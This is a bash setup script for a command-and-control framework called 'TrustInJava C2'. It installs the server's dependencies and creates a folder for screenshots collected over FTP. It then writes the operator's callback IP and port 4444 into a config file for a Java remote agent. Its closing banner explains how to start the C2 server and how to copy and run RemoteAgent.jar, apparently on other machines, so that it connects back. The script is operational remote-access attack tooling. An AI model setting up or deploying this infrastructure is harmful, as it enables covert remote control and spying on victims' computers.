#!/bin/bash
# TrustInJava C2 - Setup Script for Linux/Mac
# by TR3XN3GR0

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo -e "${CYAN}"
echo "╔════════════════════════════════════════════════════════════╗"
echo "║              TrustInJava C2 - Setup Script                ║"
echo "║                     by TR3XN3GR0                          ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${YELLOW}[1/5] Checking Python...${NC}"
if ! command -v python3 &>/dev/null; then
    echo -e "${RED}[!] Python3 not found.${NC}"
    echo -e "${WHITE}    Install with: sudo apt install python3 python3-pip   (Debian/Ubuntu)${NC}"
    echo -e "${WHITE}                  brew install python                    (macOS)${NC}"
    exit 1
fi
PYVER=$(python3 --version)
echo -e "${GREEN}[+] $PYVER${NC}"

echo -e "${YELLOW}[2/5] Checking Java...${NC}"
if ! command -v java &>/dev/null; then
    echo -e "${RED}[!] Java not found.${NC}"
    echo -e "${WHITE}    Install with: sudo apt install default-jre             (Debian/Ubuntu)${NC}"
    echo -e "${WHITE}                  brew install --cask temurin              (macOS)${NC}"
    echo -e "${WHITE}    Minimum version: Java 11${NC}"
    exit 1
fi
JAVAVER=$(java -version 2>&1 | head -1)
echo -e "${GREEN}[+] $JAVAVER${NC}"

echo -e "${YELLOW}[3/5] Installing Python dependencies...${NC}"
cd "$SCRIPT_DIR/C2Server"
python3 -m pip install --upgrade pip -q
python3 -m pip install -r requirements.txt
if [ $? -ne 0 ]; then
    echo -e "${RED}[!] Failed to install dependencies.${NC}"
    exit 1
fi
echo -e "${GREEN}[+] All Python dependencies installed${NC}"

echo -e "${YELLOW}[4/5] Creating required directories...${NC}"
mkdir -p ftp_files/screenshots
echo -e "${GREEN}[+] Directories ready${NC}"

echo -e "${YELLOW}[5/5] Setting up config.ep...${NC}"
AGENT_DIR="$SCRIPT_DIR/JavaAgent.jar.src/dist"

if [ -z "$1" ]; then
    read -p "Enter your C2 server IP (the IP agents will connect to): " C2IP
else
    C2IP="$1"
fi

C2PORT="${2:-4444}"
printf "%s\n%s" "$C2IP" "$C2PORT" > "$AGENT_DIR/config.ep"
echo -e "${GREEN}[+] config.ep created at: $AGENT_DIR/config.ep${NC}"
echo -e "${WHITE}    IP: $C2IP | Port: $C2PORT${NC}"

echo -e "${CYAN}"
echo "╔════════════════════════════════════════════════════════════╗"
echo "║                    Setup Complete!                        ║"
echo "╠════════════════════════════════════════════════════════════╣"
echo "║                                                           ║"
echo "║  Start the C2 server:                                     ║"
echo "║    cd C2Server && python3 c2_server.py                    ║"
echo "║                                                           ║"
echo "║  Web Interface: http://localhost:5000                     ║"
echo "║  Agent Listener: 0.0.0.0:4444                             ║"
echo "║  FTP Server: 0.0.0.0:2121                                 ║"
echo "║                                                           ║"
echo "║  Deploy the agent:                                        ║"
echo "║    Copy JavaAgent.jar.src/dist/RemoteAgent.jar            ║"
echo "║    Copy JavaAgent.jar.src/dist/config.ep                  ║"
echo "║    Run: java -jar RemoteAgent.jar                         ║"
echo "║                                                           ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
